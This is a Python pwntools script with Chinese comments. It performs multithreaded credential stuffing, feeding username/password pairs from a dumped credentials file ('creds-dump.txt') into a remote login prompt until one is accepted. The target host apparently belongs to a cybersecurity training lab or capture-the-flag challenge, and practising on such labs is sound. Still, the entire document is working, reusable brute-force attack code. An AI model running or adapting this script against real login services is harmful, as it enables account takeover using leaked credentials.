from pwn import *
from dataclasses import dataclass
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor

# 设置架构
context.arch = "amd64"

# 日志的详细输出使用 debug，仅错误使用 error
# context.log_level = "debug"
context.log_level = "error"

def connect_remote(remote_host="127.0.0.1", remote_port=1337):
    """
    远程连接包装器
    """
    remote_tube = remote(host=remote_host, port=remote_port)
    return remote_tube


@dataclass
class task_item_obj:
    """任务内容"""
    task_func: Callable[..., bool]
    task_argv: list

@dataclass
class task_result_obj(object):
    """任务结果"""
    recv_byte: bytes
    is_timeout: bool

def task_data_generator_builder(file_path):
    """
    将暴破数据构造为生成器，每次调整
    """
    # 读取凭证文件为格式为 `用户名;密码`
    # 设置为生成器，以字符串格式逐行读取并格式化
    with open(file_path) as f:
        for data_block in f:
            data_block_clear = data_block.strip()
            if data_block_clear == "":
                continue

            # 格式清理
            data_username, data_password = data_block_clear.split(';')

            # 以数据对象形式传递
            task_item = task_item_obj(
                task_func = task_core, 
                task_argv = [data_username.encode(), data_password.encode()]
            )

            yield task_item

def do_task(cur_tube, data_username, data_password):
    """
    执行交互的函数，每次调整
    """
    # 测试凭据
    cur_tube.sendlineafter(delim_username, data_username)
    cur_tube.sendlineafter(delim_password, data_password)

    # 接收所有数据直到超时或 EOF
    recv_byte: bytes = cur_tube.recvrepeat(0.4)
    # 此处使用必然回显的密码字段与换行作为超时判断
    mark_end = data_password + b'\r\n'
    mark_end_index = recv_byte.find(mark_end)
    is_timeout = False
    if mark_end_index == -1:
        is_timeout = True
    elif recv_byte[mark_end_index+len(mark_end):] == b"":
        is_timeout = True

    # 返回接收的数据与连接状态
    return task_result_obj(recv_byte, is_timeout)

def check_task(recv_byte: bytes):
    """
    检查暴破结果的函数，每次调整，或合并
    """
    check_result = False
    # 若非空且非 miss，则结束任务
    if miss not in recv_byte:
        log.info(b"hit:\n")
        log.info(recv_byte)
        check_result = True
    return check_result

def task_core(data_username, data_password):
    """
    单次任务的调度函数，决定继续重试或完成，每次调整
    """
    while True:
        # 每次建立连接，执行任务后关闭
        cur_tube = connect_remote(host, port)
        task_result: task_result_obj = do_task(cur_tube, data_username, data_password)
        cur_tube.close()
        log.info([data_username, data_password])
        log.info(task_result)
        # 若未超时，则查看任务结果。否则继续尝试任务
        if not task_result.is_timeout:
            break

    task_check_result = check_task(task_result.recv_byte)
    return task_check_result

def worker(task_item):
    """
    线程工作者，调用工作调度函数
    - hit 时抛出将被传递的异常以终止任务组
    """

    # 执行阻塞任务，得到任务结果
    work_result = task_item.task_func(*task_item.task_argv)

    if work_result:
        # 若任务 hit 则抛出异常终止所有工作
        raise RuntimeError(f""">>> hit: {task_item.task_argv}<<< """)
    
def main(task_data_generator, queue_size=6, worker_num=6):
    """
    主函数，使用滑动窗口数量型任务派发
    - 使用 ThreadPoolExecutor() 创建线程池
        - max_workers 设置作为工作者的线程数量
    - 使用 executor.map() 向工作者派发任务
        - buffersize 设置有界任务队列大小，传递迭代器惰性填充任务组
    - 使用 hit 工作者抛出的异常终止任务组
    """

    # 创建拥有 max_workers 个线程的线程池
    with ThreadPoolExecutor(max_workers=worker_num) as executor:
        try:
            # `.map` 的 `buffersize` 设置任务组大小，惰性填充任务组，而非立即设置。
            # 相当于拥有 Queue 的任务派发者
            for res in executor.map(worker, task_data_generator, buffersize=queue_size):
                # 迭代器取引发异常的工作者的值时，传递异常
                pass

        except* RuntimeError as eg:
            # `except*` 接收单个或一组异常（单个异常被包装为异常组）
            for e in eg.exceptions:
                # 遍历异常组
                log.info(e)

            # 自动取消剩余任务

"""
Please enter your username & password to login.
Username: rora
rora
Password: winner1
winner1

Invalid username or password
"""

delim_username = b"Username:"
delim_password = b"Password:"
miss = b'Invalid username or password'

host, port = "chatelaine.cylabacademy.net 14208".split()

task_data_generator = task_data_generator_builder("creds-dump.txt")

main(task_data_generator)
